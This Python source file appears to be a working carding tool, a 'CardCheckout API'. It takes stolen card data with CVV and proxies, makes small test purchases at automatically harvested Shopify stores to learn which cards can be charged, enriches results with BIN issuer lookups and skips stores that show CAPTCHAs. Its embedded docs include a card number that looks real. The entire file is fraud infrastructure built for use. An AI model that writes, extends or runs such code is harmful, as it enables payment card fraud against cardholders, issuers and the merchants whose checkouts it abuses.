"""
api_server.py — CardCheckout API

URL formats supported:
  /?<cc>&proxy=<proxy>&url=<shop>     (raw cc, no key)   ← reference format
  /?cc=<cc>&proxy=<proxy>&url=<shop>  (standard key)
  /?<cc>                              (no proxy, no url)

Proxy is optional. If a proxy fails, the engine retries without one.
Sites are auto-picked from the harvester pool (≤$3 products) unless `url=` is provided.
Sites that return CAPTCHA_REQUIRED are marked and excluded from future picks.
"""
from __future__ import annotations

import asyncio
import concurrent.futures
import functools
import logging
import os
import time
import urllib.parse
from typing import Optional

import httpx
from fastapi import FastAPI, Query, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

from checkout_engine import (
    run_checkout_for_card,
    parse_card_entry,
    normalize_proxy,
    CheckResult,
    CheckStatus,
)
import site_fetcher

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("api")

THREADS       = int(os.environ.get("CHECKER_THREADS", "100"))
MAX_RETRIES   = int(os.environ.get("CHECKER_RETRIES", "1"))
CHECK_TIMEOUT = float(os.environ.get("CHECKER_TIMEOUT", "120"))

_pool = concurrent.futures.ThreadPoolExecutor(max_workers=THREADS, thread_name_prefix="chk")

app = FastAPI(
    title="CardCheckout API",
    version="1.2.0",
    docs_url=None, redoc_url=None, openapi_url=None,
)


# ═══════════════════════════════════════════════════════════════════════
#  BIN lookup
# ═══════════════════════════════════════════════════════════════════════

_BIN_CACHE: dict[str, dict] = {}


async def _bin_lookup(bin6: str) -> dict:
    if not bin6 or len(bin6) < 6:
        return {}
    if bin6 in _BIN_CACHE:
        return _BIN_CACHE[bin6]
    try:
        async with httpx.AsyncClient(timeout=8) as client:
            r = await client.get(f"https://bins.antipublic.cc/bins/{bin6}")
            if r.status_code != 200:
                return {}
            data = r.json()
    except Exception:
        return {}
    if not isinstance(data, dict) or not data.get("bin"):
        return {}
    out = {
        "brand":        (data.get("brand") or "").upper(),
        "bank":         (data.get("bank") or "").upper() or "UNKNOWN",
        "country_name": data.get("country_name") or "",
        "country_flag": data.get("country_flag") or "",
    }
    _BIN_CACHE[bin6] = out
    return out


# ═══════════════════════════════════════════════════════════════════════
#  Response model
# ═══════════════════════════════════════════════════════════════════════

class CheckResponse(BaseModel):
    cc: str = ""
    Gateway: str = "Shopify Payments"
    Response: str = "ERROR"
    Price: float = 0.0
    Currency: str = "USD"
    Brand: str = "UNKNOWN"
    Issuer: str = "UNKNOWN"
    Country: str = "UNKNOWN"
    Status: bool = False
    Proxy: str = "None"
    Time: str = "0.00s"


async def _to_response(res: CheckResult, proxy_input: Optional[str],
                       proxy_worked: bool, started: float) -> CheckResponse:
    bin6 = res.card.split("|")[0][:6] if res.card else ""
    bin_info = await _bin_lookup(bin6) if bin6 else {}

    brand = bin_info.get("brand") or "UNKNOWN"
    issuer = bin_info.get("bank") or "UNKNOWN"
    country = bin_info.get("country_name") or ""
    flag = bin_info.get("country_flag") or ""
    country_display = f"{country} {flag}".strip() or "UNKNOWN"

    try:
        price_f = float(str(res.amount).replace("$", "").strip()) if res.amount else 0.0
    except (ValueError, TypeError):
        price_f = 0.0

    if not proxy_input:
        proxy_status = "None"
    elif proxy_worked:
        proxy_status = "Live"
    else:
        proxy_status = "Dead"

    charged = res.status == CheckStatus.CHARGED
    elapsed = time.perf_counter() - started

    return CheckResponse(
        cc          = res.card or "",
        Gateway     = "Shopify Payments",
        Response    = res.status_code or res.status.value or "UNKNOWN",
        Price       = round(price_f, 2),
        Currency    = res.currency or "USD",
        Brand       = brand,
        Issuer      = issuer,
        Country     = country_display,
        Status      = charged,
        Proxy       = proxy_status,
        Time        = f"{elapsed:.2f}s",
    )


# ═══════════════════════════════════════════════════════════════════════
#  Runner
# ═══════════════════════════════════════════════════════════════════════

async def _run_once(cc: str, proxy_url: str, shop_url: str) -> CheckResult:
    loop = asyncio.get_running_loop()
    fn = functools.partial(run_checkout_for_card, shop_url, cc, proxy_url, CHECK_TIMEOUT)
    try:
        return await loop.run_in_executor(_pool, fn)
    except Exception as exc:
        log.warning("worker exception: %s", exc)
        return CheckResult(card=cc, status=CheckStatus.ERROR,
                           shop_url=shop_url,
                           status_code="WORKER_EXCEPTION",
                           error=str(exc), retryable=True)


def _is_proxy_error(res: CheckResult) -> bool:
    if not res.error:
        return False
    low = res.error.lower()
    return any(k in low for k in (
        "proxy", "tunnel", "connect", "timeout", "refused",
        "407", "502", "503", "504", "ssl",
    ))


async def _run(cc_raw: str, proxy_raw: Optional[str], url: Optional[str]) -> CheckResponse:
    started = time.perf_counter()

    # ── card
    try:
        cc = (cc_raw or "").strip()
        parse_card_entry(cc)
    except Exception as exc:
        return CheckResponse(
            cc       = cc_raw or "",
            Response = "CARD_INVALID",
            Time     = f"{time.perf_counter() - started:.2f}s",
            Proxy    = "None" if not proxy_raw else "Dead",
        )

    # ── proxy
    proxy_url = ""
    proxy_worked = False
    if proxy_raw:
        try:
            proxy_url = normalize_proxy(proxy_raw)
        except Exception as exc:
            log.warning("invalid proxy: %s — continuing without", exc)
            proxy_url = ""

    # ── site
    shop_url = (url or "").strip().rstrip("/")
    if not shop_url:
        shop_url = site_fetcher.pick_site() or ""
    if not shop_url:
        return CheckResponse(
            cc       = cc,
            Response = "NO_SITES",
            Proxy    = "Live" if proxy_url else "None",
            Time     = f"{time.perf_counter() - started:.2f}s",
        )
    if not shop_url.startswith(("http://", "https://")):
        shop_url = "https://" + shop_url

    # ── attempt 1: with proxy
    if proxy_url:
        res = await _run_once(cc, proxy_url, shop_url)

        # CAPTCHA → mark and return
        if res.status_code == "CAPTCHA_REQUIRED":
            site_fetcher.report_captcha(shop_url)
            return await _to_response(res, proxy_raw, proxy_worked=True, started=started)

        # Success or non-proxy failure → return
        if res.status not in (CheckStatus.ERROR,) or not _is_proxy_error(res):
            proxy_worked = True
            if res.status in (CheckStatus.CHARGED, CheckStatus.APPROVED):
                site_fetcher.report_success(shop_url)
            elif res.status == CheckStatus.ERROR and res.retryable:
                site_fetcher.report_failure(shop_url, weight=1)
            return await _to_response(res, proxy_raw, proxy_worked=True, started=started)

        log.info("proxy failed (%s) — retrying without proxy", (res.error or "")[:80])

    # ── attempt 2: without proxy
    res = await _run_once(cc, "", shop_url)

    if res.status_code == "CAPTCHA_REQUIRED":
        site_fetcher.report_captcha(shop_url)
    elif res.status in (CheckStatus.CHARGED, CheckStatus.APPROVED):
        site_fetcher.report_success(shop_url)
    elif res.status == CheckStatus.ERROR and res.retryable:
        site_fetcher.report_failure(shop_url, weight=1)

    return await _to_response(res, proxy_raw, proxy_worked=proxy_worked, started=started)


# ═══════════════════════════════════════════════════════════════════════
#  Query string parser
# ═══════════════════════════════════════════════════════════════════════

def _parse_raw_query(raw_qs: str) -> tuple[str, Optional[str], Optional[str]]:
    """Parse both `?<cc>&proxy=...` and `?cc=...&proxy=...` formats."""
    if not raw_qs:
        return "", None, None

    cc, proxy, url = "", None, None

    for part in raw_qs.split("&"):
        if not part:
            continue
        if "=" in part:
            k, v = part.split("=", 1)
            v = urllib.parse.unquote(v)
            k_lower = k.strip().lower()
            if k_lower == "proxy":
                proxy = v.strip() or None
            elif k_lower in ("url", "site"):
                url = v.strip() or None
            elif k_lower == "cc":
                cc = v.strip()
        else:
            v = urllib.parse.unquote(part).strip()
            if v and not cc:
                cc = v

    return cc, proxy, url


# ═══════════════════════════════════════════════════════════════════════
#  Routes
# ═══════════════════════════════════════════════════════════════════════

@app.get("/", response_model=CheckResponse)
async def root(request: Request):
    raw_qs = request.scope.get("query_string", b"").decode("utf-8", errors="ignore")
    cc, proxy, url = _parse_raw_query(raw_qs)
    if not cc:
        return CheckResponse(Response="MISSING_CC", Time="0.00s")
    return await _run(cc, proxy, url)


@app.get("/check", response_model=CheckResponse)
async def check(
    cc:    str = Query(...),
    proxy: Optional[str] = Query(None),
    url:   Optional[str] = Query(None),
):
    return await _run(cc, proxy, url)


class PostBody(BaseModel):
    cc:    str
    proxy: Optional[str] = None
    url:   Optional[str] = None


@app.post("/check", response_model=CheckResponse)
async def check_post(body: PostBody):
    return await _run(body.cc, body.proxy, body.url)


@app.get("/health")
async def health():
    return {
        "ok":            True,
        "threads":       THREADS,
        "retries":       MAX_RETRIES,
        "sites":         site_fetcher.pool_size(),
        "captcha":       site_fetcher.captcha_size(),
    }


@app.get("/sites")
async def sites():
    return site_fetcher.snapshot()


@app.get("/sites/harvest")
async def sites_harvest():
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(
        None, functools.partial(site_fetcher.harvest_once, 200)
    )
    return {"ok": True, **result}


@app.get("/sites/refresh")
async def sites_refresh():
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(
        None, functools.partial(site_fetcher.harvest_once, 200)
    )
    return {"ok": True, **result}


@app.get("/sites/captcha/clear")
async def captcha_clear(url: Optional[str] = Query(None)):
    n = site_fetcher.clear_captcha(url)
    return {"ok": True, "cleared": n}


# ═══════════════════════════════════════════════════════════════════════
#  Docs
# ═══════════════════════════════════════════════════════════════════════

_DOCS = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>CardCheckout API</title>
<style>body{background:#0b0d12;color:#e5e7eb;font-family:ui-monospace,Menlo,monospace;
max-width:820px;margin:60px auto;padding:0 24px;line-height:1.6}
h1{color:#a78bfa}h3{color:#22d3ee;margin-top:32px}
code{background:#151823;padding:2px 8px;border-radius:6px;color:#38bdf8}
pre{background:#151823;padding:16px;border-radius:10px;overflow:auto;color:#d1d5db}
a{color:#22d3ee;text-decoration:none}hr{border:none;border-top:1px solid #1f2937;margin:28px 0}
.badge{background:#1e1b4b;color:#a78bfa;padding:3px 10px;border-radius:20px;font-size:12px}
</style></head><body>
<h1>CardCheckout API <span class="badge">v1.2</span></h1>
<p>Auto-harvests $0.10–$3.00 Shopify stores. Works with or without proxy. Skips CAPTCHA stores.</p>
<hr>
<h3>GET / — reference format</h3>
<pre>/ ?4031630721650843|06|2029|910&proxy=host:port:user:pass</pre>
<p>With explicit site:</p>
<pre>/ ?4031630721650843|06|2029|910&proxy=...&url=https://store.myshopify.com</pre>
<h3>Response</h3>
<pre>{
  "cc":       "4031630721650843|06|2029|910",
  "Gateway":  "Shopify Payments",
  "Response": "ORDER_PLACED | CARD_DECLINED | CAPTCHA_REQUIRED | ERROR",
  "Price":    8.99,
  "Currency": "USD",
  "Brand":    "MASTERCARD",
  "Issuer":   "KB KOOKMIN CARD CO., LTD",
  "Country":  "SOUTH KOREA 🇰🇷",
  "Status":   false,
  "Proxy":    "Live | Dead | None",
  "Time":     "11.99s"
}</pre>
<h3>Pool tools</h3>
<p><a href="/sites">/sites</a> ·
   <a href="/sites/harvest">/sites/harvest</a> ·
   <a href="/sites/captcha/clear">/sites/captcha/clear</a> ·
   <a href="/health">/health</a></p>
</body></html>"""


@app.get("/docs", response_class=HTMLResponse)
async def docs():
    return HTMLResponse(_DOCS)


if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", "8081"))
    log.info("starting api on :%d threads=%d", port, THREADS)
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")
